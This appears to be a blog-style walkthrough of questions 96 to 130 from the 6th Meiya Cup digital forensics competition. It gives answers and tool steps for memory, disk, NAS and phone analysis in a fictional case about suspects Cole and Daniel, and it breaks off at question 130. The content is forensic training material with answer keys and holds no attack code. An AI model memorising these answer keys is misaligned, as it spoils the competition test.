<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026357.png" alt="image-20211028192953458"></p>
<p>其中在文件系统日志这里能看到详细信息</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026358.png" alt="image-20211028193804019">     </p>
<p>操作可以看出是删除了某些信息</p>
<p>或者使用取证大师</p>
<p>提供了精确到秒的</p>
<p>2020 09 18 01:01:08 UTC + 0000 ，通过搜时间找到这个时间点</p>
<p>在应用程序运行痕迹最后访问时间排序也可</p>
<p>打开了 eraser.exe（eraser是常见数据擦除软件）<br>通过分析<br>//$Extend /UnJrnl/$J ，转换成日志，然后找文件的操作详情。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026359.png" alt="image-20211028195705318"></p>
<h2 id="96"><a href="#96" class="headerlink" title="96"></a>96</h2><table>
<thead>
<tr>
<th>FTK  Imager.exe的PID是甚么?</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:368;B:660;C:1288;D:2224;E:2456.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>内存镜像中获取</p>
<p>Pslist 命令</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026361.png" alt="image-20211028202107947"></p>
<h2 id="97"><a href="#97" class="headerlink" title="97"></a>97</h2><table>
<thead>
<tr>
<th>FTK  Imager.exe的父应用程序是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:592;B:660;C:1288;D:2224;E:2456.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>同上</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026362.png" alt="image-20211028202210587"></p>
<h2 id="98"><a href="#98" class="headerlink" title="98"></a>98</h2><table>
<thead>
<tr>
<th>FTK  Imager.exe使用甚么DLL？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:mmlang.dll;B:Normal.dll;C:sensapi.dll;D:Secu.dll;E:WINNS.dll.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>方法一：dlllist命令，可导出到txt文件后挨个搜索</p>
<p>dllist –pid=2456精确搜索</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026363.png" alt="image-20211028202418232"></p>
<p>方法二：使用timeliner 命令</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026364.png" alt="image-20211028202547201"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026365.png" alt="image-20211028202552807"></p>
<p>方法三：查找其pf 预读文件</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026366.png" alt="image-20211028203017341"></p>
<p>导出后，使用Winprefetchview 来进行查看</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026367.png" alt="image-20211028203038696"></p>
<h2 id="99"><a href="#99" class="headerlink" title="99"></a>99</h2><table>
<thead>
<tr>
<th>MpCmdRun.exe的PID是甚么?</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:660;B:1288;C:1388;D:2240;E:2456.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>psscan和 psxview 可以查看隐藏进程</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026368.png" alt="image-20211028203153946"></p>
<h2 id="100"><a href="#100" class="headerlink" title="100"></a>100</h2><table>
<thead>
<tr>
<th>以下哪个与MpCmdRun.exe相关的项目是正确？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:该进程于2020-09-17 11:15:57 UTC  + 0000创建;B:该过程于2020-09-18 01:20:57 UTC +  0000终止;C:该进程由schost.exe启动;D:该过程是通过网络驱动器启动的;E:这不是合法程序.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026369.png" alt="image-20211028203909861"></p>
<h2 id="101"><a href="#101" class="headerlink" title="101"></a>101</h2><table>
<thead>
<tr>
<th>上次启动后，笔记本计算机连接的外部IP是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:31.12.82.1;B:40.10.261.1;C:218.112.79.1;D:218.112.172.8;E:未连接/未连接到任何外部IP.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>使用netscan命令查看有无远程连接进程</p>
<p>foreign address里没有显示ip</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026370.png" alt="image-20211028204003775"></p>
<h2 id="102"><a href="#102" class="headerlink" title="102"></a>102</h2><table>
<thead>
<tr>
<th>上次启动后，笔记本计算机连接的网络驱动器路径是甚么？</th>
<th>E</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:E:/;B:F:/;C:G:/;D:Z:/;E:未连接/未连接到任何外部IP.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>同上题</p>
<h2 id="103"><a href="#103" class="headerlink" title="103*"></a>103*</h2><table>
<thead>
<tr>
<th>Cole公司的一位客户有一封电子邮件<code>m*b*@ms**.z**.**.tw</code>，可以在Cole的笔记本计算机中找到此数据吗？ （某些字符被故意用*遮盖）</th>
<th>A</th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:是;B:否;C:无法确定，因为找不到这样的文件;D:由于信息太有限，无法确定;E:由于数据已加密，无法确定.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>vips.txt里面有该电子邮件地址   </p>
<h2 id="104"><a href="#104" class="headerlink" title="104*"></a>104*</h2><table>
<thead>
<tr>
<th>收到上述电子邮件的客户名称是甚么？</th>
<th>C</th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:陈志;B:陈志林;C:陈宜;D:郭倍;E:No  customer data was found.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026371.png" alt="image-20211031173748427"></p>
<p>找到对应的该行</p>
<h2 id="105"><a href="#105" class="headerlink" title="105*"></a>105*</h2><table>
<thead>
<tr>
<th>属于上述客户的电话号码是甚么？ （某些字符被故意用*遮盖）</th>
<th></th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:3225<strong>1*;B:61</strong>221<strong>;C:62</strong>6<em>82</em>;D:65<strong>25</strong>7;E:No  customer data was found.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>见上图</p>
<h2 id="106"><a href="#106" class="headerlink" title="106*"></a>106*</h2><table>
<thead>
<tr>
<th>上述客户可能居住的区域是甚么？</th>
<th></th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:Hong Kong Island;B:Kowloon  City ;C:Tsuen Wan;D:Tin Shui wai;E:No customer data was found.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>TIN SHUI WAI，见上图</p>
<h2 id="107-Cole的PI的哈希值（SHA-256）是甚么？"><a href="#107-Cole的PI的哈希值（SHA-256）是甚么？" class="headerlink" title="107 Cole的PI的哈希值（SHA-256）是甚么？"></a>107 Cole的PI的哈希值（SHA-256）是甚么？</h2><table>
<thead>
<tr>
<th>Cole的PI的哈希值（SHA-256）是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:0556EABC9BECCFA67E825864EBAB7B503EEC293C6209CDC931016D2F1D081F7C;B:05569BECCFA67E825864EBAB7B503EEC293C6209CDC931016D2F1D081F7CEABC;C:9BECCFA67E825864EBAB7B503EEC293C6209CDC931016D2F1D081F7C0556EABC;D:AA8C9BECCFA67E825864EBAB7B503EEC293C6209CDC931016D2F1D081F7C0556;E:EABC9BECCFA67E825864EBAB7B503EEC293C6209CDC931016D2F1D081F7C0556.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026372.png" alt="image-20211028204907205"></p>
<h2 id="108"><a href="#108" class="headerlink" title="108"></a>108</h2><table>
<thead>
<tr>
<th>Cole PI 装置的操作系统是甚么？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:Android;B:Debian;C:Mac;D:Ubuntu24;E:Windows.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026373.png" alt="image-20211028205044727"></p>
<p>但是仿真失败 </p>
<p>火眼导入识别一下</p>
<h2 id="109"><a href="#109" class="headerlink" title="109"></a>109</h2><table>
<thead>
<tr>
<th>操作系统是甚么版本？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:20.1.1 LTS (Focal  Fossa);B:20.01.1 LTS (Focal Fossa);C:20.02.1 LTS (Focal Fossa);D:20.03.1 LTS  (Focal Fossa);E:20.04.1 LTS (Focal Fossa).</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>同上</p>
<h2 id="110"><a href="#110" class="headerlink" title="110"></a>110</h2><table>
<thead>
<tr>
<th>装置的文件系统是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:Android;B:Ext  4;C:EXT;D:iOS;E:NTFS.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026374.png" alt="image-20211028205427279"></p>
<p>或</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026375.png" alt="image-20211028205507820"></p>
<h2 id="111"><a href="#111" class="headerlink" title="111*"></a>111*</h2><table>
<thead>
<tr>
<th>操作系统的时区是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:Asia/Amman;B:Asia/  Baku;C:Asia/Shanghai;D:Asia/Seoul;E:Asia/Tokyo.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>在/etc/timezone 可以找到</p>
<h2 id="112"><a href="#112" class="headerlink" title="112"></a>112</h2><table>
<thead>
<tr>
<th>哪个文件包含儿童色情物品内容？（某些字符被故意用*遮盖）</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:”Partition  2*<em>r\pt</em>c1.jpg,Partition 2*<em>r\pt</em>c2.jpg,Partition  2*<em>r\pt</em>c3.jpg”;B:”Partition 2\v<strong>\ptha1.jpg,Partition  2\v</strong>\ptha2.jpg,Partition 2\v<strong>\ptha3.jpg”     ;C:”Partition 2\mnt\pth</strong>.jpg,Partition 2\mnt\pth<strong>.jpg,Partition  2\mnt\pth</strong>.jpg”;D:”Partition 2*<em>hc1.jpg,Partition  2*</em>hc2.jpg,Partition 2*<em>hc3.jpg”;E:”Partition  2\media\pt*</em>.jpg,Partition 2\media\pt<strong>(1).jpg,Partition  2\media\pt</strong>(2).jpg”.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>找找图片</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026376.png" alt="image-20211029153123796"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026377.png" alt="image-20211029153247278"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026378.png" alt="image-20211029153258279"></p>
<p>这三个</p>
<h2 id="113"><a href="#113" class="headerlink" title="113"></a>113</h2><table>
<thead>
<tr>
<th>Cole PI装置中的儿童色情物品的创建时间是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:2020/09/15  11:21;B:2020/09/15 17:21;C:2020/09/15 18:21;D:2020/09/16 19:21;E:242020/09/15  20:21.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026379.png" alt="image-20211029153358004"></p>
<h2 id="114-Cole-NAS的哈希值（SHA-256）是甚么"><a href="#114-Cole-NAS的哈希值（SHA-256）是甚么" class="headerlink" title="114 Cole  NAS的哈希值（SHA-256）是甚么?"></a>114 Cole  NAS的哈希值（SHA-256）是甚么?</h2><table>
<thead>
<tr>
<th>Cole  NAS的哈希值（SHA-256）是甚么?</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:28715B79890D90B661183F6849469FA2042D103D629A6BC9A4304E39B13C019D;B:2871890D90B661183F6849469FA2042D103D629A6BC9A4304E39B13C019D5B79;C:5B79890D90B661183F6849469FA2042D103D629A6BC9A4304E39B13C019D2871;D:6879890D90B661183F6849469FA2042D103D629A6BC9A4304E39B13C019D2871;E:890D90B661183F6849469FA2042D103D629A6BC9A4304E39B13C019D28715B79.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026380.png" alt="image-20211029154740393"></p>
<h2 id="115"><a href="#115" class="headerlink" title="115"></a>115</h2><table>
<thead>
<tr>
<th>儿童色情数据存放在哪里？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:Partition  3\cole-shared\media;B:Partition 4\cole\media;C:Partition  4\cole_shared\DCIM;D:Partition 4\cole_shared\media;E:Partition  4\cole_share\mnt.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026381.png" alt="image-20211029161919073"></p>
<h2 id="116"><a href="#116" class="headerlink" title="116"></a>116</h2><table>
<thead>
<tr>
<th>设备中现有多少儿童色情数据？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:1;B:2;C:3;D:4;E:5.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>同上</p>
<h3 id="117"><a href="#117" class="headerlink" title="117"></a>117</h3><table>
<thead>
<tr>
<th>Cole NAS装置中的儿童色情物品的创建时间是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:2020/09/13  16:51;B:2020/09/14 16:50;C:2020/09/14 16:51;D:2020/09/15 16:51;E:2020/09/15  17:57.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026382.png" alt="image-20211029161936343"></p>
<h2 id="118-在Cole手机-的用户个人资料是甚么？"><a href="#118-在Cole手机-的用户个人资料是甚么？" class="headerlink" title="118 在Cole手机, 的用户个人资料是甚么？"></a>118 在Cole手机, 的用户个人资料是甚么？</h2><table>
<thead>
<tr>
<th>在Cole手机, 的用户个人资料是甚么？</th>
<th>D</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:<a href="mailto:colefung@gmail.com">colefung@gmail.com</a>;B:<a href="mailto:colefung99@gmail.com">colefung99@gmail.com</a>;C:<a href="mailto:cole909@gmail.com">cole909@gmail.com</a>;D:<a href="mailto:colefung909@gmail.com">colefung909@gmail.com</a>;E:<a href="mailto:colefung999@gmail.com">colefung999@gmail.com</a>.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>veracrypt里的文件有问题，当时也发了单独的镜像文件下载链接</p>
<p>使用手机大师加载该镜像文件</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026383.png" alt="image-20211031203811004"></p>
<h2 id="119"><a href="#119" class="headerlink" title="119"></a>119</h2><table>
<thead>
<tr>
<th>Cole的手机上有社交媒体帐户吗？如有，那是甚么？</th>
<th>B</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:<a href="mailto:63766465@s.whatsapp.net">63766465@s.whatsapp.net</a>;B:<a href="mailto:85263766465@s.whatsapp.net">85263766465@s.whatsapp.net</a>;C:<a href="mailto:852-62766465@s.whatsapp.net">852-62766465@s.whatsapp.net</a>;D:<a href="mailto:C85263766465@s.whatsapp.net">C85263766465@s.whatsapp.net</a>;E:<a href="mailto:COLE-63766465@s.whatsapp.net">COLE-63766465@s.whatsapp.net</a>.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026384.png" alt="image-20211031204223443"></p>
<h2 id="120"><a href="#120" class="headerlink" title="120"></a>120</h2><table>
<thead>
<tr>
<th>Cole与Bob和Alice在同一个小组中进行过交流吗？它是甚么？</th>
<th>A</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:是的，在whatsapp组ID中的群聊消息：<a href="mailto:85262547937-1600392878@g.us">85262547937-1600392878@g.us</a>;B:是的，在whatsapp组ID中的群聊消息：<a href="mailto:85262547937-1600392878@g.hk">85262547937-1600392878@g.hk</a>;C:是的，在whatsapp组ID中的群聊消息：85252547937-1600392878@.us;D:是的，在whatsapp组ID中的群聊消息：<a href="mailto:62547937-1600392878@g.us">62547937-1600392878@g.us</a>;E:不，他们在Cole的设备中找不到公共聊天组.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026385.png" alt="image-20211031204334751"></p>
<h2 id="121"><a href="#121" class="headerlink" title="121"></a>121</h2><table>
<thead>
<tr>
<th>Cole手机的Android ID是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:a626a98cb2bb965ec;B:606a98cb2bb965eca;C:626a98cb2bb965ec;D:65ec626a98cb2bb9;E:626aa8cb2bb965ec626a.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026386.png" alt="image-20211031204526974"></p>
<h2 id="122"><a href="#122" class="headerlink" title="122"></a>122</h2><table>
<thead>
<tr>
<th>已安装的WhatsApp APK文件的哈希值（SHA-256）是甚么?</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:06fa2cce80923de8646f835b72d1fb06a97343a5b7242bc3972627c78e1bb318;B:8e1b06fa2cce80923de8646f835b72d1fb06a97343a5b7242bc3972627c7b318;C:8e1bb31806fa2cce80923de8646f835b72d1fb06a97343a5b7242bc3972627c7;D:b31806fa2cce80923de8646f835b72d1fb06a97343a5b7242bc3972627c78e1b;E:b4l806fa2cce80923de8646f835b72d1fb06a97343a5b7242bc3972627c78elb.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>目前不具备手机镜像仿真能力，无法找到该 apk 文件×</p>
<p>手机大师不好寻找，使用取证大师加载可以看到分区名称（火眼就行），在userdata分区有一个app目录，通常app的apk文件下载在此处</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026387.png" alt="image-20211031204820800"></p>
<p>  找到后计算即可</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026388.png" alt="image-20211031204933190"></p>
<h2 id="123"><a href="#123" class="headerlink" title="123"></a>123</h2><table>
<thead>
<tr>
<th>列出Chrome的五个“关键词搜索”。</th>
<th>B</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:”bulk mailer, ddos  creator, fortress online, parknshop, GitHub malware”;B:”bulk mail,  bulk mailers, ddos creator, fortress online, bitcoin”;C:”bulk mail,  bulk mai1er, ddos creator, fortress online, bitcoin”;D:”bulk mai1,  bulk mailer, ddos creator, parknshop, GitHub malware”;E:”fortress  on1ine, bitcoin, apple, parknshop, GitHub malware”.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026389.png" alt="image-20211029190155085"></p>
<p>小变化，考细心</p>
<h2 id="124"><a href="#124" class="headerlink" title="124"></a>124</h2><table>
<thead>
<tr>
<th>在哪里可以找到“Cole的电话”的通话记录？</th>
<th>A</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:Table:call;B:Table:calls;C:Table:contact;D:Table:contacts;E:Table:sms.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>火眼找到通话记录源文件</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026390.png" alt="image-20211031205616543"></p>
<p>calls表里记载</p>
<h2 id="125"><a href="#125" class="headerlink" title="125"></a>125</h2><table>
<thead>
<tr>
<th>2020-09-01至2020-09-30之间，“Cole”收到了多少条SMS讯息？</th>
<th>A</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:2;B:3;C:4;D:5;E:6.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>删除的记录一定要减去，<br>官网的答案 是未删除的条数</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026391.png" alt="image-20211029190232175"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026392.png" alt="image-20211029190353620"></p>
<h2 id="126"><a href="#126" class="headerlink" title="126"></a>126</h2><table>
<thead>
<tr>
<th>在Cole的“  whatsapp”联络人中，有多少用户正在使用“  whatsapp”？</th>
<th>A</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:2;B:3;C:4;D:5;E:6.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>盘古石手机取证直接得出</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026393.png" alt="image-20211029190413362"></p>
<h1 id="团体赛Daniel部分"><a href="#团体赛Daniel部分" class="headerlink" title="团体赛Daniel部分"></a>团体赛Daniel部分</h1><h2 id="127-Daniel的桌上计算机的哈希值（SHA-256）是甚么"><a href="#127-Daniel的桌上计算机的哈希值（SHA-256）是甚么" class="headerlink" title="127 Daniel的桌上计算机的哈希值（SHA-256）是甚么?"></a>127 Daniel的桌上计算机的哈希值（SHA-256）是甚么?</h2><table>
<thead>
<tr>
<th>Daniel的桌上计算机的哈希值（SHA-256）是甚么?</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:E588564CA7AAA5352F6A1215A9F1FBE4;B:FBE4564CA7AAA5352F6A1215A9F1E588;C:01DD40CF28603F421F3A09CD38F1C8AA40A2AC4BFB46ECF8299C38CE6AE44EO5;D:07DD40CF28603F421F3A09CD38F1C8AA40A2AC4BFB46ECF8299C38CE6AE44ED5;E:4ED540CF28603F421F3A09CD38F1C8AA40A2AC4BFB46ECF8299C38CE6AE407DD.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>xways 直接得出</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026394.png" alt="image-20211029190952085"></p>
<h2 id="128-该桌上计算机操作系统储存在哪个分区上？"><a href="#128-该桌上计算机操作系统储存在哪个分区上？" class="headerlink" title="128 该桌上计算机操作系统储存在哪个分区上？"></a>128 该桌上计算机操作系统储存在哪个分区上？</h2><table>
<thead>
<tr>
<th>该桌上计算机操作系统储存在哪个分区上？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:Partition 1;B:Partition  2;C:Partition 3;D:Partition 4;E:Partition 5.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026395.png" alt="image-20211029192116422"></p>
<h2 id="129"><a href="#129" class="headerlink" title="129"></a>129</h2><table>
<thead>
<tr>
<th>在桌上计算器机中找到Daniel的电子邮件地址是甚么？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:<a href="mailto:daniel43346@gmail.com">daniel43346@gmail.com</a>;B:<a href="mailto:daniellaw43346@gmail.com">daniellaw43346@gmail.com</a>;C:<a href="mailto:daniellaw43346@yahoo.com">daniellaw43346@yahoo.com</a>;D:<a href="mailto:daniellaw43346@yahoo.com.hk">daniellaw43346@yahoo.com.hk</a>;E:<a href="mailto:daniellaw43346@ymail.com">daniellaw43346@ymail.com</a>.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026396.png" alt="image-20211029192158435"></p>
<h2 id="130"><a href="#130" class="headerlink" title="130"></a>130</h2><table>
<thead>
<tr>
<th>该恶意软件感染源是甚么？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
